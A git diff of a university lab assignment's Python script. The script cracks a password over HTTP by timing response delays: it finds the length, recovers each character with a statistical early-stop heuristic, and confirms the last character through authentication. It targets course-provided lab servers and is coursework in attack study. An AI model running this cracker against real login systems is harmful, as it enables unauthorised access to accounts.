@@ -1,24 +1,64 @@
 #!/usr/bin/env python3
 """
-Timing Side-Channel Attack Implementation
+Timing Side-Channel Attack Implementation - single-file version
 Course: Attacks on Implementations of Secure Systems
 Student ID: 316279942
 
-Cracks a vulnerable password check by measuring response times.
-Supports:
-- Phase 1: Length detection
-- Phase 2: Position-by-position timing attack with early-stop heuristic
-- Phase 3: Last character verification
+WHAT THIS CODE DOES
+-------------------
+This script performs a timing side-channel attack against a vulnerable
+password-checking endpoint. It runs three phases:
+  1) Detect password length by measuring response times for padded guesses.
+  2) Crack each character position using timing differences. It uses an
+     early-stop heuristic to save requests when the environment is stable.
+  3) Verify the last character by checking the authentication response.
 
-Tuned to work fast on local Docker, with switches to run against the remote server.
+TERMS & METRICS (short explanation)
+----------------------------------
+- estimated_step:
+    The typical time gain (delta) observed when the server compares one
+    additional correct character before failing. For example, if a wrong
+    guess returns in ~0.53s but the correct character yields ~0.78s, the
+    per-character timing gain is ~0.25s. We compute this as:
+        delta = t_best - mean(t_others)
+    and track it across positions using an exponential moving average (EMA).
+
+- threshold (used for early-stop decision):
+    When testing a new position we:
+      * measure times for tested characters so far (times_seen),
+      * compute mu = mean(times_seen), sigma = stddev(times_seen),
+      * compute noise_threshold = min_sigma_multiplier * sigma,
+      * compute history_threshold = delta_safety_factor * estimated_step (if known),
+      * choose threshold = max(noise_threshold, history_threshold).
+    We accept (early-stop) a candidate if its gap over mu >= threshold.
+    This ensures it's above both statistical noise and consistent with the
+    learned step from previous positions.
+
+LOGGING & OUTPUT
+---------------
+- Prints the config at the start.
+- Shows per-position: how many letters tested, early-stop decision, threshold used,
+  the position time (letter_time) and total elapsed time (both shown in minutes and seconds).
+- On completion or KeyboardInterrupt, appends a summary into `attack_run.log`.
+
+USAGE NOTES
+-----------
+- For local Docker, set base_url to "http://127.0.0.1/" and samples_per_test=1.
+- For remote server, set base_url to "http://132.72.81.37/" and increase samples_per_test
+  (e.g., 3 or 5) and consider disabling enable_early_stop or making thresholds stricter.
+
 """
 
 import time
 import logging
 from dataclasses import dataclass
 from typing import Dict, Optional, List
-
 import requests
+from datetime import datetime
+import json
+import os
+import signal
+import sys
 
 
 # ============================================================================
@@ -29,26 +69,27 @@ import requests
 class AttackConfig:
     """Configuration parameters for the timing attack."""
 
-    # ----- TARGET SETTINGS -----
-    # Local Docker:
+    # target settings (edit here to switch)
     base_url: str = "http://127.0.0.1/"
-
-    # Remote server example (UNCOMMENT + ADJUST user/password only for testing URLs):
-    # base_url: str = "http://132.72.81.37/"
-    # NOTE: For the attack, we only change password dynamically; user & difficulty below.
+    # example remote: "http://132.72.81.37/"
 
     user_name: str = "316279942"
     difficulty: int = 1
 
-    # ----- ATTACK SETTINGS -----
+    # attack settings
     max_password_length: int = 32
     charset: str = "abcdefghijklmnopqrstuvwxyz"
 
-    # Samples per tested candidate (increase on noisy/remote server)
-    samples_per_test: int = 1
+    samples_per_test: int = 1         # increase for noisy remote server (3-5)
+    enable_early_stop: bool = True    # consider False for noisy remote server
 
-    # Enable/disable early-stop heuristic (useful locally; may disable remotely)
-    enable_early_stop: bool = True
+    # tuning for the early-stop heuristic (can be tuned for remote)
+    min_samples_for_decision: int = 5
+    delta_safety_factor: float = 0.6
+    min_sigma_multiplier: float = 3.0
+
+    # external log file
+    external_log_path: str = "attack_run.log"
 
     def get_test_url(self, password: str) -> str:
         return f"{self.base_url}?user={self.user_name}&password={password}&difficulty={self.difficulty}"
@@ -65,7 +106,7 @@ class AttackLogger:
         self.logger = logging.getLogger("TimingAttack")
         self.logger.setLevel(log_level)
 
-        # Avoid duplicate handlers if re-created
+        # Avoid duplicate handlers on re-run within same interpreter
         if not self.logger.handlers:
             console_handler = logging.StreamHandler()
             console_handler.setLevel(log_level)
@@ -109,11 +150,11 @@ class AttackLogger:
 
 class RequestHandler:
     """Handles HTTP requests with timing measurements."""
-
     def __init__(self, logger: AttackLogger):
         self.logger = logger
         self.total_requests = 0
-        self.session = requests.Session()  # reuse connection for stability/speed
+        self.session = requests.Session()
+        self.start_time: Optional[float] = None
 
     def send_request(self, url: str) -> requests.Response:
         self.total_requests += 1
@@ -155,11 +196,7 @@ class PasswordLengthDetector:
         for length in range(1, self.config.max_password_length + 1):
             test_password = "a" * length
             test_url = self.config.get_test_url(test_password)
-
-            avg_time = self.request_handler.measure_timing(
-                test_url,
-                self.config.samples_per_test
-            )
+            avg_time = self.request_handler.measure_timing(test_url, self.config.samples_per_test)
             timing_data[length] = avg_time
             self.logger.debug(f"Length {length:2d}: {avg_time:.6f}s")
 
@@ -178,21 +215,12 @@ class PasswordLengthDetector:
 
 
 # ============================================================================
-# Phase 2: Character Cracker with Early-Stop
+# Phase 2: Character Cracker with Early-Stop + timing outputs in minutes
 # ============================================================================
 
 class CharacterCracker:
     """
-    Cracks individual password characters using timing analysis.
-
-    Optimization:
-    - Maintain estimated_step: moving average of the timing gain when one
-      more character is correct.
-    - For each new position:
-        * test characters sequentially;
-        * after enough samples, if the current best is clearly above others
-          (vs noise, and vs estimated_step), early-stop and accept it.
-    - If signal is weak or early-stop disabled, fall back to full scan.
+    Cracks individual password characters using timing analysis with early-stop.
     """
 
     def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
@@ -200,32 +228,33 @@ class CharacterCracker:
         self.request_handler = request_handler
         self.logger = logger
 
-        self.estimated_step: Optional[float] = None  # moving avg of Δ
+        # moving average of the per-character timing gain
+        self.estimated_step: Optional[float] = None
 
-        # Early-stop tuning (safe for local; tweak for remote if needed)
-        self.min_samples_for_decision = 5
-        self.delta_safety_factor = 0.6
-        self.min_sigma_multiplier = 3.0
+        # bring thresholds from config for convenience
+        self.min_samples_for_decision = config.min_samples_for_decision
+        self.delta_safety_factor = config.delta_safety_factor
+        self.min_sigma_multiplier = config.min_sigma_multiplier
+
+    @staticmethod
+    def _format_minutes(seconds: float) -> str:
+        """Return string with minutes and seconds: 'Xm YYs' and decimal minutes."""
+        mins = seconds / 60.0
+        secs = seconds
+        return f"{mins:.3f} min ({secs:.2f}s)"
 
     def crack_position(self, current_password: str, password_length: int, position: int) -> str:
-        """
-        Crack a single character position in the password.
-
-        Uses adaptive early-stop based on previously learned timing gap.
-        Falls back to full scan if the signal is unclear.
-        """
-        # start timer for this position
         position_start = time.time()
         self.logger.info(f"Testing position {position}/{password_length}...")
 
         timing_data: Dict[str, float] = {}
         times_seen: List[float] = []
 
-        best_char = None
-        best_time = -1.0
+        best_char: Optional[str] = None
+        best_time: float = -1.0
 
         early_stopped = False
-        last_threshold_used = 0.0  # for logging
+        last_threshold_used = 0.0
 
         for idx, char in enumerate(self.config.charset, start=1):
             test_password = self._build_test_password(current_password, char, password_length)
@@ -235,8 +264,8 @@ class CharacterCracker:
             for _ in range(self.config.samples_per_test):
                 resp = self.request_handler.send_request(test_url)
                 total_time += resp.elapsed.total_seconds()
-
             avg_time = total_time / self.config.samples_per_test
+
             timing_data[char] = avg_time
             times_seen.append(avg_time)
 
@@ -244,11 +273,7 @@ class CharacterCracker:
                 best_time = avg_time
                 best_char = char
 
-            # Try early-stop only if we have enough samples and it's enabled
-            if (
-                self.config.enable_early_stop
-                and idx >= self.min_samples_for_decision
-            ):
+            if self.config.enable_early_stop and idx >= self.min_samples_for_decision:
                 should_stop, threshold = self._should_early_stop(times_seen, best_time)
                 last_threshold_used = threshold
                 if should_stop:
@@ -258,35 +283,33 @@ class CharacterCracker:
         if best_char is None:
             best_char = max(timing_data, key=timing_data.get)
 
-        # compute timings
         position_elapsed = time.time() - position_start
-        # read global attack timer if exists; fallback to position start if not set
         global_start = getattr(self.request_handler, "start_time", None)
         total_elapsed = time.time() - global_start if global_start is not None else position_elapsed
 
-        # Update our estimate of Δ_step using the statistics from this position
+        # update estimate
         self._update_step_estimate(timing_data, best_char)
 
-        # Print diagnostics: how many letters actually tested + thresholds + time info
         tested_letters = len(timing_data)
+        letter_time_str = self._format_minutes(position_elapsed)
+        total_time_str = self._format_minutes(total_elapsed)
+
         if self.config.enable_early_stop:
             self.logger.info(
                 f"Position {position}: tested {tested_letters} letters "
                 f"(early_stop={'YES' if early_stopped else 'NO'}), "
                 f"estimated_step={self._fmt_or_na(self.estimated_step)}s, "
                 f"threshold_used={last_threshold_used:.6f}s, "
-                f"letter_time={position_elapsed:.3f}s, total_elapsed={total_elapsed:.3f}s"
+                f"letter_time={letter_time_str}, total_elapsed={total_time_str}"
             )
         else:
             self.logger.info(
                 f"Position {position}: tested all {tested_letters} letters "
                 f"(early_stop=DISABLED), estimated_step={self._fmt_or_na(self.estimated_step)}s, "
-                f"letter_time={position_elapsed:.3f}s, total_elapsed={total_elapsed:.3f}s"
+                f"letter_time={letter_time_str}, total_elapsed={total_time_str}"
             )
 
-        # Print the per-position ranked candidates
         self._print_position_results(timing_data, best_char, position)
-
         return best_char
 
     # ----------------- helpers -----------------
@@ -307,7 +330,6 @@ class CharacterCracker:
         gap = best_time - mu
 
         noise_threshold = self.min_sigma_multiplier * sigma
-
         if self.estimated_step is not None and self.estimated_step > 0:
             history_threshold = self.delta_safety_factor * self.estimated_step
         else:
@@ -331,7 +353,7 @@ class CharacterCracker:
         if self.estimated_step is None:
             self.estimated_step = delta
         else:
-            alpha = 0.5  # EMA
+            alpha = 0.5
             self.estimated_step = alpha * delta + (1 - alpha) * self.estimated_step
 
         self.logger.debug(f"Updated estimated_step: {self.estimated_step:.6f}s")
@@ -340,10 +362,8 @@ class CharacterCracker:
     def _print_position_results(timing_data: Dict[str, float], best: str, position: int):
         if not timing_data:
             return
-
         sorted_chars = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)
         best_time = timing_data[best]
-
         print(f"\n  Top candidates for position {position}:")
         top_k = min(5, len(sorted_chars))
         for i, (char, time_val) in enumerate(sorted_chars[:top_k], 1):
@@ -357,42 +377,33 @@ class CharacterCracker:
 
 
 # ============================================================================
-# Phase 3: Last Character Verification
+# Phase 3: Last Character Verifier
 # ============================================================================
 
 class LastCharacterVerifier:
-    """Verifies the last character by checking actual authentication."""
-
     def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
         self.config = config
         self.request_handler = request_handler
         self.logger = logger
 
     def verify_last_char(self, current_password: str) -> Optional[str]:
-        self.logger.print_section(
-            f"PHASE 3: Last Character Verification (Position {len(current_password) + 1})"
-        )
-
+        self.logger.print_section(f"PHASE 3: Last Character Verification (Position {len(current_password) + 1})")
         for char in self.config.charset:
             test_password = current_password + char
             test_url = self.config.get_test_url(test_password)
             response = self.request_handler.send_request(test_url)
-
             if response.text.strip() == "1":
                 self.logger.info(f"✓ Found correct last character: '{char}'")
                 return char
-
         self.logger.warning("✗ No correct last character found")
         return None
 
 
 # ============================================================================
-# Orchestrator
+# Orchestrator + external logging
 # ============================================================================
 
 class PasswordCracker:
-    """Main orchestrator for the password cracking attack."""
-
     def __init__(self, config: AttackConfig, logger: AttackLogger):
         self.config = config
         self.logger = logger
@@ -401,104 +412,85 @@ class PasswordCracker:
         self.char_cracker = CharacterCracker(config, self.request_handler, logger)
         self.last_char_verifier = LastCharacterVerifier(config, self.request_handler, logger)
 
-    def crack_from_scratch(self) -> str:
-        """
-        Crack the entire password from scratch.
+    @staticmethod
+    def _format_minutes(seconds: float) -> str:
+        mins = seconds / 60.0
+        return f"{mins:.3f} min ({seconds:.2f}s)"
 
-        Returns:
-            The cracked password
-        """
-        # set global attack timer here so CharacterCracker can read it
+    def crack_from_scratch(self) -> str:
+        # global timer accessible by character cracker
         overall_start = time.time()
-        # store it on request_handler; minimal intrusive change so other classes can access
         self.request_handler.start_time = overall_start
 
         self.logger.print_header("TIMING SIDE-CHANNEL PASSWORD CRACKER")
-        print(f"  Target User: {self.config.user_name}")
-        print(f"  Difficulty: {self.config.difficulty}")
-        print(f"  Samples per test: {self.config.samples_per_test}")
-        print(f"  Early stop: {'ENABLED' if self.config.enable_early_stop else 'DISABLED'}")
+        # print full config at start
+        cfg_dict = {
+            k: v for k, v in vars(self.config).items() if not k.startswith("__")
+        }
+        # mask nothing; print config nicely
+        print("  Running with configuration:")
+        for k, v in cfg_dict.items():
+            print(f"    {k}: {v}")
         print()
 
-        # Phase 1: Detect password length
+        self.logger.info("Starting Phase 1: Detect password length")
         password_length = self.length_detector.detect_length()
 
-        # Phase 2: Crack each character position
+        self.logger.info("Starting Phase 2: Crack positions")
         cracked_password = self._crack_all_positions(password_length)
 
-        # Final verification
         elapsed_time = time.time() - overall_start
         self._print_final_results(cracked_password, elapsed_time)
-
         return cracked_password
 
     def crack_with_resume(self, resume_from: str, password_length: int) -> str:
-        start_time = time.time()
+        overall_start = time.time()
+        self.request_handler.start_time = overall_start
 
         self.logger.print_header("RESUMING PASSWORD CRACKING")
-        print(f"  Target User: {self.config.user_name}")
-        print(f"  Difficulty: {self.config.difficulty}")
         print(f"  Resume from: '{resume_from}' (Position {len(resume_from) + 1}/{password_length})")
         print()
 
-        cracked_password = self._crack_from_position(resume_from, password_length)
-
-        elapsed_time = time.time() - start_time
-        self._print_final_results(cracked_password, elapsed_time)
-        return cracked_password
+        cracked = self._crack_from_position(resume_from, password_length)
+        elapsed_time = time.time() - overall_start
+        self._print_final_results(cracked, elapsed_time)
+        return cracked
 
     def _crack_all_positions(self, password_length: int) -> str:
         self.logger.print_section("PHASE 2: Character Position Cracking")
-
         current_password = ""
-
         for position in range(1, password_length + 1):
-            # Last character handled via actual verification
             if position == password_length:
                 last_char = self.last_char_verifier.verify_last_char(current_password)
                 if last_char:
                     current_password += last_char
                 break
 
-            next_char = self.char_cracker.crack_position(
-                current_password, password_length, position
-            )
+            next_char = self.char_cracker.crack_position(current_password, password_length, position)
             current_password += next_char
-            self.logger.info(
-                f"✓ Password progress: '{current_password}' "
-                f"({len(current_password)}/{password_length})"
-            )
+            self.logger.info(f"✓ Password progress: '{current_password}' ({len(current_password)}/{password_length})")
             print()
-
         return current_password
 
     def _crack_from_position(self, resume_from: str, password_length: int) -> str:
         current_password = resume_from
         start_position = len(resume_from) + 1
-
         for position in range(start_position, password_length + 1):
             if position == password_length:
                 last_char = self.last_char_verifier.verify_last_char(current_password)
                 if last_char:
                     current_password += last_char
                 break
-
-            next_char = self.char_cracker.crack_position(
-                current_password, password_length, position
-            )
+            next_char = self.char_cracker.crack_position(current_password, password_length, position)
             current_password += next_char
-            self.logger.info(
-                f"✓ Password progress: '{current_password}' "
-                f"({len(current_password)}/{password_length})"
-            )
+            self.logger.info(f"✓ Password progress: '{current_password}' ({len(current_password)}/{password_length})")
             print()
-
         return current_password
 
     def _print_final_results(self, password: str, elapsed_time: float):
         self.logger.print_header("ATTACK COMPLETE")
         print(f"  ✓ CRACKED PASSWORD: '{password}'")
-        print(f"  ⏱ Total Time: {elapsed_time:.2f} seconds ({elapsed_time/60:.2f} minutes)")
+        print(f"  ⏱ Total Time: {self._format_minutes(elapsed_time)}")
         total_requests = self.request_handler.get_request_count()
         print(f"  📊 Total Requests: {total_requests}")
         if total_requests > 0:
@@ -508,7 +500,6 @@ class PasswordCracker:
     def verify_password(self, password: str) -> bool:
         test_url = self.config.get_test_url(password)
         response = self.request_handler.send_request(test_url)
-
         is_correct = response.text.strip() == "1"
         status = "✓ CORRECT" if is_correct else "✗ INCORRECT"
         self.logger.info(f"Password verification: {status}")
@@ -517,46 +508,100 @@ class PasswordCracker:
 
 
 # ============================================================================
+# External log writer
+# ============================================================================
+
+def append_run_log(path: str, payload: dict):
+    """Append JSON line to external log path (create if missing)."""
+    try:
+        os.makedirs(os.path.dirname(path), exist_ok=True) if os.path.dirname(path) else None
+        with open(path, "a", encoding="utf-8") as f:
+            f.write(json.dumps(payload, ensure_ascii=False) + "\n")
+    except Exception as e:
+        print(f"Failed to append to log file {path}: {e}")
+
+
+# ============================================================================
 # Main
 # ============================================================================
 
 def main():
-    """
-    To switch between local and remote:
-
-    - Local Docker (fast, strong signal):
-        base_url="http://127.0.0.1/"
-        samples_per_test=1
-        enable_early_stop=True
-
-    - Remote server (noisier, be conservative):
-        base_url="http://132.72.81.37/"  # or provided URL base
-        samples_per_test=3 or 5
-        enable_early_stop=False  (or True with stricter tuning in CharacterCracker)
-    """
-
+    # ---- edit here to switch target quickly ----
     config = AttackConfig(
-        # base_url="http://127.0.0.1/",  # change to "http://127.0.0.1/" for local
-        # base_url="http://132.72.81.37/",  # change to "http://132.72.81.37/" for remote
+        # base_url="http://127.0.0.1/",   # change to "http://132.72.81.37/" for remote
         base_url="http://aoi-assignment1.oy.ne.ro:8080/",  # change to "http://132.72.81.37/" for remote
-        user_name="316279942",         # change to your ID on remote
+        user_name="316279942",          # change user if needed
+        # user_name="208145268",          # change user if needed
         difficulty=1,
-        samples_per_test=3,            # increase for remote (e.g. 3-5)
-        enable_early_stop=True         # consider False for remote
+        samples_per_test=1,             # increase to 3-5 on noisy remote
+        enable_early_stop=True          # False or stricter thresholds on remote
     )
+    # -------------------------------------------
 
     logger = AttackLogger(log_level=logging.INFO)
     cracker = PasswordCracker(config, logger)
 
-    cracked_password = cracker.crack_from_scratch()
+    # prepare run metadata for external log
+    run_id = datetime.utcnow().isoformat() + "Z"
+    run_meta = {
+        "run_id": run_id,
+        "start_time_utc": datetime.utcnow().isoformat() + "Z",
+        "config": vars(config),
+        "result": None,
+        "interrupted": False,
+        "elapsed_seconds": None,
+        "total_requests": None
+    }
 
-    print()
-    logger.print_section("FINAL VERIFICATION")
-    cracker.verify_password(cracked_password)
+    cracked_password = None
+    start = time.time()
+
+    # handle Ctrl+C gracefully
+    def _sigint_handler(sig, frame):
+        raise KeyboardInterrupt()
+
+    signal.signal(signal.SIGINT, _sigint_handler)
+
+    try:
+        cracked_password = cracker.crack_from_scratch()
+        elapsed = time.time() - start
+        run_meta["result"] = {"password": cracked_password}
+        run_meta["elapsed_seconds"] = elapsed
+        run_meta["total_requests"] = cracker.request_handler.get_request_count()
+        append_run_log(config.external_log_path, run_meta)
+
+    except KeyboardInterrupt:
+        elapsed = time.time() - start
+        run_meta["interrupted"] = True
+        run_meta["elapsed_seconds"] = elapsed
+        run_meta["total_requests"] = cracker.request_handler.get_request_count()
+        run_meta["result"] = {"partial_password": getattr(cracker, "char_cracker", None) and getattr(cracker, "char_cracker", "N/A")}
+        append_run_log(config.external_log_path, run_meta)
+        logger.warning("Interrupted by user (KeyboardInterrupt). Run summary written to log.")
+        print()
+
+    except Exception as e:
+        elapsed = time.time() - start
+        run_meta["elapsed_seconds"] = elapsed
+        run_meta["total_requests"] = cracker.request_handler.get_request_count()
+        run_meta["result"] = {"error": str(e)}
+        append_run_log(config.external_log_path, run_meta)
+        logger.error(f"Unhandled exception: {e}")
+        raise
+
+    else:
+        logger.info("Run complete. Summary written to external log.")
+        print()
+
+    # final verification print (if cracked)
+    if cracked_password:
+        logger.print_section("FINAL VERIFICATION")
+        cracker.verify_password(cracked_password)
 
 
 if __name__ == "__main__":
     main()
+
 
 
 # PS C:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1> & C:\Users\dorfe\AppData\Local\Programs\Python\Python313\python.exe "c:/Users/dorfe/OneDrive/Desktop/Projects_2025/Milumentor/Masters/Atacks/Atcks Drill 1/Moving_Average_Refactor.py"
